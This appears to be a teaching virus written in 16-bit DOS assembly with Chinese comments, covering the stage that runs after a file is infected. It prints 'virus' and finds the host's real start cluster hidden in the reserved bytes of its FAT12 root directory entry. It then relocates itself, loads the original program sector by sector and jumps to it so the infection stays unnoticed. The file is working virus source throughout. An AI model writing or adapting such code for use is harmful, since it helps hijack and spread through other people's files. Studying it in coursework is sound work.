org 100h
DispStr:
	mov	ax, Msg
	mov	bp, ax			; ES:BP = 串地址
	mov	cx, 5			; CX = 串长度
	mov	ax, 01301h		; AH = 13,  AL = 01h
	mov	bx, 000ch		; 页号为0(BH = 0) 黑底红字(BL = 0Ch,高亮)
	mov	dl, 8
	mov	dh, 3
	int	10h			; 10h 号中断
;获取本执行程序的文件名，如何启动时输入了路径，还包括路径名
push path
push ds
call GetExe
add sp, 4
;获取纯的文件名，根据readme描述的简化，此病毒只感染a盘根目录的，
;所以就不进行readme中的定位执行程序全路径的算法了
add ax, path;此时ax是文件名长
;从最后一个字节开始回溯遇到的第一个'\'
mov si, ax
_loop_find_path:
dec si
cmp si, path
jz _not_find_path
cmp byte [si], '\'
jnz _loop_find_path
inc si;找到了\，因此指针项后调整一个字节
_not_find_path: ;此时si就是文件名的首址

;开始找该文件的目录项，感染后被感染文件的首簇是指向病毒文件的，但我们获得了被感染文件的名字，因此需要找到
;被感染文件的真实内容并加载，而此时，被感染文件的真实首簇号保存在其目录项的保留区
;目录项的保留区从目录项头第13个字节即偏移0ch开始，共10字节，我们保存在最后两字节，即偏移0x14的两字节
;按照简化约定，被感染文件小于512字节，所以我们不追溯fat表，直接加载该扇区即可。
mov ax, si  ;传入被感染程序的名字
call GetInfectedSector
test ax, ax
jnz _resumeInfectedFile
ret ;未找到被感染文件的首扇区


_resumeInfectedFile:
push ax ;ax是被感染文件的首扇区号

; move virus code to next 512 300h = $$ + 0200h
;des di, src si, count cx
mov di, $$ + 0200h
mov si, MovedCode
mov cx, movedcount

call Memove
jmp $$ + 0200h; jmp to movedcode which copied to 100h + 200h

MovedCode:
xor ah, ah ; reset drive
xor dl, dl
int 13h

pop ax;get sector which is pushed after ResumeInfectedFile
mov cl, 1
mov bx, $$;将被感染程序的内容加载到100h，去执行之
call ReadSector
mov ax, $$
jmp ax; 跳到恢复的被感染文件内容去执行对com就是100h,不要直接用jmp $$因为这会用相对偏移，而代码搬迁后，这个偏移需要修订。

ReadSector:;该函数的绝对扇区号是从0开始的
;ax SectorNO, cl num , bx buf
push bp
mov bp, sp
sub sp, 2
push bx
mov byte [bp - 2], cl
mov bl, 18
div bl
inc ah; sectorno
mov cl, ah; set sectorno
mov dh, al
and dh, 1; hdr
shr al, 1; trackno track在磁盘文件上是按同trackno的所有磁头的连续存放，因为软盘2磁头，所以除以2
mov ch, al;set track no 
mov dl, 0; drive 0
pop bx
mov ah, 02h; read
mov al, [bp - 2]; read [bp-2] sectors
int 13h
add sp, 2
pop bp
ret

movedcount equ $ - MovedCode

GetExe:; path seg, offset;参数通过压栈传递,两个参数,是存储执行程序名的段和偏移量
;传入填写文件名的内存地址，第一个是段地址，第2个是偏移,返回ax，表示串长
push bp
mov bp, sp
push ds
mov bx, [2ch];目前段偏移2ch处存储的是环境块的段地址，环境块在该段的0偏移处
mov ds, bx;因为在另外的段，所以数据段读取时更换了段值
xor si, si 
_loop:
mov ax, [si];取出两个字节给ax，要判断是否连续两个都为零
inc si
test ax, ax;比较是否连续两个0，因为ax是两字节
jnz _loop
inc si
add si, 2 ;跳过两个字节，似乎是参数的个数，但总是1
push si
mov ax, [bp + 6]
push ax
mov ax, [bp + 4]
push ax
call StrCpyL
add sp, 6
pop ds
pop bp
ret

StrCpyL:;des seg,des offset,src
;三个参数，头两个为目标串的段地址和偏移
;第三个是源串地址,返回值ax为串长
push bp
mov bp, sp
push es
mov si, [bp + 8]
mov es, [bp + 4]
;es是目标串的段，di是其偏移
mov di, [bp + 6]
xor bx, bx
;这个StrCpyL是在两个数据段之间复制数据，所以，将目标串的段地址和偏移传递进来
;而源地址就用本身的DS段
_loop2:
mov al, [si]
test al, al
jz _end
mov [es:di], al;为了寻址目标串的空间，就用mov [es:di]来寻址
inc si
inc di
inc bx
jmp _loop2
_end:
mov [es:di], al
pop es
pop bp
mov ax, bx
ret


GetInfectedSector:;返回值是ax，指出了被感染文件的扇区号,失败ax为0，传入ax被感染文件名的首址
sub sp, 32;在栈上分配32字节内存区保存找到的文件名对应目录项
;ax 目前正好是被感染文件名首址,不用设定
mov cx, sp
call FindRootDirEntry;在根目录中寻找文件对应目录项，没找找ax非0，找到后将其拷贝到
;指定的32字节内存区

test ax, ax
jnz _found_dir_entry
ret
_found_dir_entry:
mov bp, sp;设定找到的根目录项首址到bp
mov ax, [bp + 14h];获取被感染文件的真正其实簇号,它存放在其dir项的偏移0x14处
;因为这个扇区号是用户区的第i号,换算成绝对扇区号要加前面fat和根root项共33个扇区,
;且这个i前面0,1废掉了,所以还要减2
sub ax, 2
add ax, 33
add sp, 32
ret

FindRootDirEntry: ;ax 传入被感染文件名的首址，
;cx传入保存dir项的内存首址， 返回ax表示成功与否，0为失败，1为成功
push bp
mov bp, sp
push cx; 保存匹配的dir内存首址
push ax;保存被感染文件名

;root dir从绝对扇区号19开始，共14个扇区
sub sp, 512;留出512字节读入一个扇区的dir内容
sub sp, 14;buf 给dir文件名的缓冲,12字节文件名加一个0，共13字节，对齐所以用14
mov bx, 14;共14扇区
mov dx, 19;root开始于绝对扇区19
_loop_sector: ;进行扇区的搜索，共14扇区
push bx
push dx

mov ax, dx;读取的扇区号
mov cl, 1;读一个扇区
lea bx, [bp - sector_buf]
call ReadSector

mov bx, 16 ;一个扇区有16个dir
lea si, [bp - sector_buf]

_loop_dir: ;对一个扇区的dir进行搜索

;si 是dir的首址，确认是否为无效dir，首字节为0或e5h都是无效的
mov al, [si]
test al, al
jz _continue_next_dir;如果其实字符是0，表示是删除的dir
cmp al, 0e5h ;如果是被删除的dir
jz _continue_next_dir
push si ;源地址
lea ax, [bp - dir_name_buf];ax是目标地址
push ax
call CopyDirFileName
add sp, 4
lea ax, [bp - dir_name_buf];str1
push ax
mov cx, [bp - infected_file_name];str2
push cx
call StrCmp
add sp, 4
test ax, ax
jz _continue_next_dir
;找到了dir
;si is ok
mov di, [bp - dir_buf]
mov cx, 32
call Memove
mov ax, 1;返回结果为真
jmp _findRootDirEntry_end

_continue_next_dir:
add si, 32;移动到下一个dir
dec bx
jnz _loop_dir

pop dx
pop bx
inc dx
dec bx
jnz _loop_sector

xor ax, ax;搜寻失败
_findRootDirEntry_end:
mov sp,bp
pop bp
ret

dir_buf equ 2
infected_file_name equ 4
sector_buf equ 512 + 4
dir_name_buf equ sector_buf + 14

CopyDirFileName: ;1目标地址, 2源地址
push bp
mov bp, sp
push si
push di
push cx
mov cx, 8;文件主名最长8字节
mov si, [bp + 6]
mov di, [bp + 4]
loop_dir_main_copy:
mov al, [si]
mov [di], al
inc si
inc di
dec cx
jz loop_dir_main_max
cmp al, 20h;如果是空格则字串结束
jnz loop_dir_main_copy
dec di ;找到了空格目标游标需要移动回空格所在位置
loop_dir_main_max:
mov si, [bp + 6]
add si, 8;指向扩展名首部
mov al, [si]
cmp al, 20h
jz _copy_dir_end;没有扩展名
mov byte [di], '.'
inc di

mov cx, 3;ext max size is 3
loop_dir_ext_copy:
mov al, [si]
mov [di], al
inc si
inc di
dec cx
jz _copy_dir_end;扩展名长度达到上限退出
cmp al, 20h;如果是空格则字串结束
jnz loop_dir_ext_copy
dec di ;找到了空格目标游标需要移动回空格所在位置

_copy_dir_end:
mov byte [di], 0

pop cx
pop di
pop si
pop bp
ret

StrCmp: ;str1, str2;比较相同返回1，否则0
push bp
mov bp, sp
push si
push di
mov si, [bp + 4]
mov di, [bp + 6]
_loop_cmp:
mov al, [si]
cmp al, [di]
jz _cmp_matched
xor ax, ax
jmp _cmp_end
_cmp_matched:
inc si
inc di
test al, al
jnz _loop_cmp
mov ax, 1
_cmp_end:
pop di
pop si
pop bp
ret


Memove:

mov al, [si]
mov  [di], al
inc di
inc si
dec cx
jnz Memove
ret

Msg db "virus"
path times 16 db 0; 在根目录的文件名(最大12字节，8个主文件名，3个宽展名，一个“.”)包括盘符（3字节a:\）一个结束符0
